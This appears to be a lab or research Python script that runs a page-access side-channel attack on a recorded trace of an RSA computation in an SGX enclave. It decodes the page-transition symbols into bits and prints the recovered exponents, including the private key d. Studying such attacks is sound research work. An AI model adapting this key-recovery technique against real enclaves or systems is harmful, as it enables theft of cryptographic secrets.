from sgxtrace import load_vcd_trace, AttackRunner

TRACE = "traces/trace_rsa.vcd"

ANCHOR, A, B, END = "_17", "_20", "_22", "_31"

def run_rsa_attack():
    trace = load_vcd_trace(TRACE)
    print(f"Loaded trace with {len(trace.times)} timestamps and {len(trace.access_history)} access events.")
    print(f"Top 5 pages: {list(trace.page_intervals.keys())[:5]}")
    
    runner = AttackRunner(trace)
    runner.verbose = True

    
    runner.state["symbols"] = []
    runner.state["results"] = []

    def on_a(r):
        r.state["symbols"].append("A")

    def on_b(r):
        r.state["symbols"].append("B")

    def on_end(r):
     
        syms = "".join(r.state["symbols"])
        if syms:
          
            tail = syms.lstrip("A")
            bits, i = [], 0
            while i < len(tail):
                if tail[i] == "B":
                    bits.append("1")
                    i += 1
                elif tail[i:i+2] == "AA":
                    bits.append("0")
                    i += 2
                else:
                    i += 1
            bitstring = "".join(bits)
            if bitstring:
                runner.state["results"].append((syms, bitstring, int(bitstring, 2)))
        
     
        r.state["symbols"] = []

    runner.on_transition(ANCHOR, A, on_a)
    runner.on_transition(ANCHOR, B, on_b)
    runner.on_page(END, on_end)

    print("Running attack...")
    runner.run()

    for i, (sym, bits, value) in enumerate(runner.state["results"]):
        print(f"[{i}] symbols={sym}  bits={bits}  value={value}")

    if len(runner.state["results"]) >= 2:
        print(f"\ne = {runner.state['results'][0][2]}")
        print(f"d = {runner.state['results'][1][2]}")

if __name__ == "__main__":
    run_rsa_attack()
